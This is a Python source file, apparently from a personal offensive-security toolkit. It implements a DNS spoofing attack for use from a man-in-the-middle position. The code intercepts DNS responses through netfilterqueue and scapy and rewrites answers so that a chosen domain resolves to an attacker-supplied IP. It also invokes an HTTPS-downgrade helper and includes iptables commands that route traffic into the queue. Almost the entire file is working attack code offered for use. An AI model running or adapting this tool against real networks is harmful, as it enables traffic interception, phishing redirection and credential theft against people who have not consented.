#!/usr/bin/env python3

# Author: Matthew Zito (goldmund) 
# Contact: https://www.github.com/MatthewZito
# Version: 0.1.0

"""
Presumes controller is MITM.
Allocates incoming DNS reqests in a queue, validates matches
against a user-input URL and supplants each DNS response thereof
with a user-provided IP. The requested URL will always resolve
to the redirect IP. (see: DNS Spoofing) 
"""
import subprocess
import netfilterqueue
import scapy.all as scapy
from scapy.layers.inet import IP, TCP, UDP
from scapy.all import DNS, DNSQR, DNSRR
from utils.downgrade_https import downgrade_https

class Spoofer:
    def __init__(self, target_url, redirect_ip):
        self.target_url = target_url
        self.redirect_ip = redirect_ip
        downgrade_https()
        self.bind_queue()
        
    def process_packet(self, packet): 
        """
        Determines how to process each packet in queue.
        Parses for those with DNS response, modifies response
        such that target_url resolves to the redirect_ip.
        """
        # wrap payload packet in Scapy IP layer
        scapy_packet_obj = IP(packet.get_payload())
        if (scapy_packet_obj.haslayer(DNSRR)):
            q_name = scapy_packet_obj[DNSQR].qname
            if (self.target_url in q_name):
                print("[+] Resolving to provided IP...")
                manufactured_res = DNSRR(rrname=q_name,rdata=self.redirect_ip)
                scapy_packet_obj[DNS].an = manufactured_res # supplant DNS answer
                scapy_packet_obj[DNS].ancount = 1 # consolidate DNS answers to 1
                # CRITICAL: scapy will autogen correct len + checksum contingent on new data
                del scapy_packet_obj[IP].len
                del scapy_packet_obj[IP].chksum
                del scapy_packet_obj[UDP].len
                del scapy_packet_obj[UDP].chksum
                # distill into original packet obj 
                packet.set_payload(str(scapy_packet_obj))
        packet.accept()

    def bind_queue(self):
        """
        Initiates a netfilterqueue object and binds to callback method
        so as to access the queue and act upon all packets therein.
        """
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, self.process_packet)
        queue.run()

    # def downgrade_https(self):
    #     """
    #     Enables queue by setting IP Tables rules to accomodate forwarding.
    #     """
    #     print("[+] Instantiating queue...")
    #     cmd = "iptables -I FORWARD -j NFQUEUE --queue-num 0"
    #     enable_port_fwd()
    #     proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    #     print(proc.communicate()[0]),
    #     self.bind_queue()


# test_cmd = "iptables -I OUTPUT -j NFQUEUE --queue-num 0; iptables -I INPUT -j NFQUEUE --queue-num 0"
        